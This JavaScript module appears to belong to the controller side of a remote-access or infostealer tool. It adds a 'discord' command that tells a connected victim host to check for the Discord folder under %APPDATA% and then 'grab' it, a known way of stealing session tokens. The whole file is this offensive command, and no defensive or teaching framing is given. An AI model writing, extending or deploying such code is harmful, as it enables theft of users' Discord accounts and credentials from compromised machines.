const COMMAND_CHECK = 0;
const COMMAND_GRAB = 1;

module.exports = function (commands) {
    commands['discord'] = discord;
};

async function discord(server, args) {
    if (args.length != 2) {
        console.log(`Usage: ${args[0]} <check|grab>`);
        return;
    }

    let packet = server.createPacket('discordcommand');
    if (args[1] == 'check') {
        packet.command = COMMAND_CHECK;
		if (await server.sendHostCommand(packet) == 0) {
			console.log('Discord folder exists at %APPDATA%/discord');
		} else {
			console.log('Could not find Discord folder at %APPDATA%/discord');
		}
    } else if (args[1] == 'grab') {
        packet.command = COMMAND_GRAB;
		let ret = await server.sendHostCommand(packet);
		if (ret != 0) {
			console.error(`ERROR: return code ${ret}`);
		}
    } else {
        console.log(`Usage: ${args[0]} <check|grab>`);
    }
}
